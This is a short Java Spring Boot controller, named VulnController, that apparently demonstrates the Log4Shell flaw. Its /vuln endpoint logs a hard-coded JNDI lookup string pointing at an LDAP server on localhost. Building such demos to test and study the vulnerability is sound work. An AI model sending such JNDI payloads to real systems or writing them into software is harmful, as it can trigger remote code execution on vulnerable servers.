package am.am;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class VulnController {

    private static final Logger log = LogManager.getLogger(VulnController.class);

    @GetMapping("/vuln")
    void index() {
        log.error("${jndi:ldap://127.0.0.1:5000/a}");
    }
}
